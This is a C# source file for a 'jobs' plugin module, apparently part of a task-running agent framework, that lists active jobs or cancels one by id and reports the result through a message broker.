using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "jobs";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            var args = JsonSerializer.Deserialize<jobs.JobsArgs>(
                job.task.parameters);

            if (args is null)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Failed to deserialize arguments.",
                    task_id = job.task.id,
                    status = "error"
                });
                return;
            }

            try
            {
                string result = args.action switch
                {
                    "list" => ListJobs(job),
                    "kill" => KillJob(args, job),
                    _ => throw new ArgumentException(
                        $"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id,
                });
            }
            catch (Exception e)
            {
                messageManager.Write(
                    e.ToString(), job.task.id, true, "error");
            }

            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }

        private string ListJobs(ServerJob job)
        {
            Dictionary<string, ServerJob> jobs =
                messageManager.GetJobs();
            DebugLog.Log(
                $"{Name} found {jobs.Count} active jobs [{job.task.id}]");
            var jobsOut = jobs.ToDictionary(
                j => j.Value.task.id, j => j.Value.task.command);
            return JsonSerializer.Serialize(jobsOut);
        }

        private string KillJob(jobs.JobsArgs args, ServerJob job)
        {
            if (string.IsNullOrEmpty(args.id))
            {
                return "No task id specified.";
            }

            if (!messageManager.TryGetJob(args.id, out ServerJob jobToKill))
            {
                DebugLog.Log(
                    $"{Name} job '{args.id}' not found [{job.task.id}]");
                return "Job not found.";
            }

            DebugLog.Log(
                $"{Name} cancelling job '{args.id}' [{job.task.id}]");
            jobToKill.cancellationtokensource.Cancel();
            return "Cancellation request sent.";
        }
    }
}
